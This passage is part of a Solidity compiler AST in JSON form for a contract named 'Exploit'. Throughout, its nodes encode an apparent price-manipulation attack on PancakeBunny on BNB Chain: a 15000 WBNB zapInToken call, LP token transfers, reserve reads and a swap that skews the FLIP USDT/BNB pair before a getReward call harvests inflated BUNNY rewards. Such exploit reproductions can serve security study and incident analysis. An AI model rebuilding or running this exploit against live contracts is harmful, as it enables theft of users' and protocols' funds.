                      "referencedDeclaration": 616,
                      "src": "4340:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (address,uint256) external"
                      }
                    },
                    "id": 448,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4340:48:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 449,
                  "nodeType": "ExpressionStatement",
                  "src": "4340:48:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 455,
                            "name": "WBNB",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 12,
                            "src": "4424:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$629",
                              "typeString": "contract IERC20"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IERC20_$629",
                              "typeString": "contract IERC20"
                            }
                          ],
                          "id": 454,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "4416:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 453,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "4416:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 456,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4416:13:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "hexValue": "3135303030653138",
                        "id": 457,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "4431:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_15000000000000000000000_by_1",
                          "typeString": "int_const 15000000000000000000000"
                        },
                        "value": "15000e18"
                      },
                      {
                        "arguments": [
                          {
                            "id": 460,
                            "name": "Pair_PancakeLps",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 36,
                            "src": "4449:15:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IPancakeERC20_$985",
                              "typeString": "contract IPancakeERC20"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IPancakeERC20_$985",
                              "typeString": "contract IPancakeERC20"
                            }
                          ],
                          "id": 459,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "4441:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 458,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "4441:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 461,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4441:24:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_15000000000000000000000_by_1",
                          "typeString": "int_const 15000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "expression": {
                        "id": 450,
                        "name": "ZapBSC",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 30,
                        "src": "4398:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IZap_$1313",
                          "typeString": "contract IZap"
                        }
                      },
                      "id": 452,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "zapInToken",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1312,
                      "src": "4398:17:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,uint256,address) external"
                      }
                    },
                    "id": 462,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4398:68:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 463,
                  "nodeType": "ExpressionStatement",
                  "src": "4398:68:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 469,
                            "name": "Pair_PancakeLps",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 36,
                            "src": "4509:15:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IPancakeERC20_$985",
                              "typeString": "contract IPancakeERC20"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IPancakeERC20_$985",
                              "typeString": "contract IPancakeERC20"
                            }
                          ],
                          "id": 468,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "4501:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 467,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "4501:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 470,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4501:24:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 475,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "4561:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_Exploit_$587",
                                  "typeString": "contract Exploit"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_Exploit_$587",
                                  "typeString": "contract Exploit"
                                }
                              ],
                              "id": 474,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "4553:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 473,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "4553:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 476,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "4553:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 471,
                            "name": "Pair_PancakeLps",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 36,
                            "src": "4527:15:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IPancakeERC20_$985",
                              "typeString": "contract IPancakeERC20"
                            }
                          },
                          "id": 472,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 912,
                          "src": "4527:25:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 477,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4527:40:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 464,
                        "name": "Pair_PancakeLps",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 36,
                        "src": "4476:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakeERC20_$985",
                          "typeString": "contract IPancakeERC20"
                        }
                      },
                      "id": 466,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 939,
                      "src": "4476:24:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 478,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4476:92:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 479,
                  "nodeType": "ExpressionStatement",
                  "src": "4476:92:0"
                },
                {
                  "assignments": [
                    481,
                    483,
                    null
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 481,
                      "mutability": "mutable",
                      "name": "amount_0",
                      "nameLocation": "4641:8:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 585,
                      "src": "4636:13:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 480,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "4636:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    },
                    {
                      "constant": false,
                      "id": 483,
                      "mutability": "mutable",
                      "name": "amount_1",
                      "nameLocation": "4656:8:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 585,
                      "src": "4651:13:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 482,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "4651:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    },
                    null
                  ],
                  "id": 489,
                  "initialValue": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "arguments": [
                          {
                            "id": 485,
                            "name": "PancakeBunny_FLIP_USDT_BNB_v1",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 66,
                            "src": "4683:29:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IPancakePair_$869",
                              "typeString": "contract IPancakePair"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IPancakePair_$869",
                              "typeString": "contract IPancakePair"
                            }
                          ],
                          "id": 484,
                          "name": "IPancakePair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 869,
                          "src": "4670:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IPancakePair_$869_$",
                            "typeString": "type(contract IPancakePair)"
                          }
                        },
                        "id": 486,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4670:43:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakePair_$869",
                          "typeString": "contract IPancakePair"
                        }
                      },
                      "id": 487,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "getReserves",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 811,
                      "src": "4670:55:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
                        "typeString": "function () view external returns (uint112,uint112,uint32)"
                      }
                    },
                    "id": 488,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4670:57:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
                      "typeString": "tuple(uint112,uint112,uint32)"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "4635:92:0"
                },
                {
                  "assignments": [
                    491
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 491,
                      "mutability": "mutable",
                      "name": "amount_In",
                      "nameLocation": "4751:9:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 585,
                      "src": "4746:14:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 490,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "4746:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 493,
                  "initialValue": {
                    "id": 492,
                    "name": "WBNB_amount",
                    "nodeType": "Identifier",
                    "overloadedDeclarations": [],
                    "referencedDeclaration": 425,
                    "src": "4763:11:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "4746:28:0"
                },
                {
                  "assignments": [
                    495
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 495,
                      "mutability": "mutable",
                      "name": "amount_Out",
                      "nameLocation": "4789:10:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 585,
                      "src": "4784:15:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 494,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "4784:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 502,
                  "initialValue": {
                    "arguments": [
                      {
                        "id": 498,
                        "name": "amount_In",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 491,
                        "src": "4822:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "id": 499,
                        "name": "amount_1",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 483,
                        "src": "4833:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "id": 500,
                        "name": "amount_0",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 481,
                        "src": "4843:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 496,
                        "name": "router",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 81,
                        "src": "4802:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakeRouter01_$1291",
                          "typeString": "contract IPancakeRouter01"
                        }
                      },
                      "id": 497,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "getAmountOut",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1257,
                      "src": "4802:19:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_pure$_t_uint256_$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                        "typeString": "function (uint256,uint256,uint256) pure external returns (uint256)"
                      }
                    },
                    "id": 501,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4802:50:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "4784:68:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 508,
                            "name": "PancakeBunny_FLIP_USDT_BNB_v1",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 66,
                            "src": "4884:29:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IPancakePair_$869",
                              "typeString": "contract IPancakePair"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IPancakePair_$869",
                              "typeString": "contract IPancakePair"
                            }
                          ],
                          "id": 507,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "4876:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 506,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "4876:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 509,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4876:38:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 510,
                        "name": "amount_In",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 491,
                        "src": "4916:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 503,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 12,
                        "src": "4862:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$629",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 505,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 598,
                      "src": "4862:13:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 511,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4862:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 512,
                  "nodeType": "ExpressionStatement",
                  "src": "4862:64:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 516,
                        "name": "amount_Out",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 495,
                        "src": "4971:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 517,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "4983:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "id": 520,
                            "name": "this",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -28,
                            "src": "4994:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Exploit_$587",
                              "typeString": "contract Exploit"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_Exploit_$587",
                              "typeString": "contract Exploit"
                            }
                          ],
                          "id": 519,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "4986:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 518,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "4986:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 521,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4986:13:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "hexValue": "",
                        "id": 522,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "5001:2:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
                          "typeString": "literal_string \"\""
                        },
                        "value": ""
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
                          "typeString": "literal_string \"\""
                        }
                      ],
                      "expression": {
                        "id": 513,
                        "name": "PancakeBunny_FLIP_USDT_BNB_v1",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 66,
                        "src": "4936:29:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakePair_$869",
                          "typeString": "contract IPancakePair"
                        }
                      },
                      "id": 515,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "swap",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 853,
                      "src": "4936:34:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$_t_uint256_$_t_address_$_t_bytes_memory_ptr_$returns$__$",
                        "typeString": "function (uint256,uint256,address,bytes memory) external"
                      }
                    },
                    "id": 523,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4936:68:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 524,
                  "nodeType": "ExpressionStatement",
                  "src": "4936:68:0"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "id": 525,
                        "name": "PancakeBunny_FLIP_USDT_BNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 42,
                        "src": "5015:26:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IVaultFlipToFlip_$1353",
                          "typeString": "contract IVaultFlipToFlip"
                        }
                      },
                      "id": 527,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "getReward",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1352,
                      "src": "5015:36:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                        "typeString": "function () external"
                      }
                    },
                    "id": 528,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5015:38:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 529,
                  "nodeType": "ExpressionStatement",
                  "src": "5015:38:0"
                },
                {
                  "assignments": [
                    531
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 531,
                      "mutability": "mutable",
                      "name": "bunnyBalance",
                      "nameLocation": "5069:12:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 585,
                      "src": "5064:17:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 530,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "5064:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 541,
                  "initialValue": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 540,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "arguments": [
                        {
                          "arguments": [
                            {
                              "id": 536,
                              "name": "this",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -28,
                              "src": "5108:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_Exploit_$587",
                                "typeString": "contract Exploit"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_Exploit_$587",
                                "typeString": "contract Exploit"
                              }
                            ],
                            "id": 535,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "5100:7:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 534,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "5100:7:0",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 537,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "5100:13:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "expression": {
                          "id": 532,
                          "name": "BUNNY",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 24,
                          "src": "5084:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IERC20_$629",
                            "typeString": "contract IERC20"
                          }
                        },
                        "id": 533,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "balanceOf",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 623,
                        "src": "5084:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$_t_uint256_$",
                          "typeString": "function (address) external returns (uint256)"
                        }
                      },
                      "id": 538,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "5084:30:0",
